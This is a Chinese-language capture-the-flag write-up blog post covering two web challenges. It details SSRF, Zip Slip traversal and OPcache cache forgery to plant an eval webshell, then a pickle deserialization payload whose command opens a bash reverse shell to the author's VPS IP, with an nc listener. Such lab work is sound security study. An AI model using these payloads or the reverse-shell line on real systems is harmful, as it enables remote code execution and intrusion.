1.2026ciscn&ccb分区赛 easy_time（续）

上周做的这道题，经过BR学长的指点，发现了一个问题，就是：在附件中，有一个名为docker-compose.yaml的配置文件，但是，这个配置文件在我们正常地通过docker build命令构建Docker镜像的时候，是不会自动引入的，必须要另外再执行一次docker compose up命令，才能使其中的配置生效。而在这个配置文件中，规定了web: read_only: true，这就意味着，我们不可能通过ZipSlip的方式将WebShell写入/var/www/html，也就是PHP服务的Web目录，所以必须改用其他方式。 这里我就按照BR学长博客中给出的Write Up进行了复现，逻辑如下（Powered By Gemini CLI, Model: Gemini 3.1 Pro Preview）：

基于对工作区代码的分析，该 CTF 题目的利用逻辑如下： 1. 核心漏洞点 * SSRF 漏洞：在 index.py 的 fetch_remote_avatar_info 函数中，利用 urllib.request.urlopen 请求用户提供的 avatar_url。由于没有对内网地址进行校验（虽然定义了 _host_is_public 但未使用），可以访问 127.0.0.1 上的服务。 * Zip Slip（目录穿越上传）：在 index.py 的 safe_upload 函数中，解压 zip 文件时直接使用了 os.path.join(dest_dir, info.filename)，未校验 filename 是否包含 ../。这允许将文件写入 /app/plugins 目录之外的任意位置。 * OPcache 配置缺陷：php.ini-development 中设置了 opcache.file_cache="/tmp" 和 opcache.file_cache_only=1。这意味着 PHP 仅从文件缓存中加载字节码，攻击者可以通过覆盖缓存文件来篡改执行逻辑。 2. 具体实现逻辑分析 第一步：信息获取与计算 (Metadata Gathering) * 获取 System ID：OPcache 的缓存路径包含一个基于 PHP 版本和编译配置的哈希值（system_id）。通过 SSRF 访问 http://127.0.0.1:80/phpinfo.php ，可以获取 PHP 版本、架构、扩展等信息用于计算该 ID。题目中已知 ID 为 45b8be9467d6ed29438f06cfe9cee9f6。 * 获取文件时间戳：OPcache 在加载缓存时会校验源文件的时间戳。通过 SSRF 访问 http://127.0.0.1:80/date.php ，由于该文件执行 echo filemtime("index.php")，攻击者可以获取目标服务器上 index.php 的精确修改时间。 第二步：恶意缓存构造 (Payload Crafting) * 本地环境搭建：使用相同的 Dockerfile（PHP 8.2.6-apache）在本地生成一个合法的 index.php.bin。 * 注入 WebShell：将 html/index.php 内容修改为恶意代码（如 <?php eval($_GET['cmd']); ?>），再次访问以刷新本地缓存文件。 * 时间戳对齐 (Timestamp Patching)：读取 date.php 返回的时间戳，将其转换为 4 字节小端序，写入 index.php.bin 的 0x40 偏移处（PHP 8.x 的 OPcache 头部结构）。 第三步：文件覆盖与触发 (Exploitation) * 构造恶意压缩包：创建一个 zip 文件，其中包含一个文件，其路径利用目录穿越指向目标缓存位置： ../../../tmp/45b8be9467d6ed29438f06cfe9cee9f6/var/www/html/index.php.bin * 上传并解压：通过 /plugin/upload 接口上传该 zip。由于 safe_upload 的漏洞，恶意 .bin 文件会覆盖 /tmp 下真实的 OPcache 缓存。 * 触发 RCE：访问 http://127.0.0.1:80/index.php?cmd=...。 此时 PHP 引擎检测到文件缓存存在且时间戳校验通过（由于之前的 Patch），直接加载并执行攻击者构造的字节码。 3. 代码验证 * 身份绕过：index.py 仅通过 Cookie visited=yes; user=admin 判断登录，无需密码。 * SSRF 提取：templates/about.html 会渲染 remote_info.content_snippet，攻击者通过 /about 页面即可读取 SSRF 返回的结果（如时间戳）。 * 自动化脚本：exp/exp.py 已经完整实现了上述逻辑，包括 Patch 时间戳、构造 Zip、上传以及最后的 RCE 请求。

2.2024羊城杯 Lyrics For You

  1. 首先，可以很明显地看出，/lyrics路由下存在SSRF，尝试后发现就是一个最简单的路径穿越。
  2. 然后，通过浏览器插件识别出靶机的后端是Python，所以尝试读取了一下app/app.py，从而获取到了网页的源代码。
  3. 将源代码格式化后导入到IDE中进行分析，可以看出，其引入了一个名为cookie的自定义模块，到网页上的SSRF注入点处一试，还真有，于是便获得了cookie.py。
  4. 分析cookie.py可知，Cookie处存在Pickle反序列化，但是WAF禁用了reduce，所以这里学习了一下这篇文章中关于Pickle反序列化原理的讲解，以及各类黑名单绕过的机制，形成了一个初步的payload：b"(cos\nsystem\nS'whoami'\no."，但是，由app.py中的return render_template('user.html', name=data["username"])可知，此处不存在命令执行的回显点，怎么办呢？通过询问AI得知，应该要使用反弹Shell的方法，但说实话，我之前还从来没遇到过要使用反弹Shell的情况，所以正好就着这道题学习了一下，最终形成了一个完整的payload：b"(cos\nsystem\nS'bash -c "bash -i >& /dev/tcp/47.123.4.104/1145 0>&1"'\no."（47.123.4.104是我VPS的公网IP）
  5. 接下来就好办了，只需要先通过SSH连接到VPS，再执行nc -lvnp 1145命令来监听VPS的1145端口（该端口此前已在VPS的网络安全组中开放），然后使用Burp带着构造好的Cookie去访问/board路由，触发反弹Shell，最后在终端中执行靶机根目录下的/readflag命令即可获得flag。
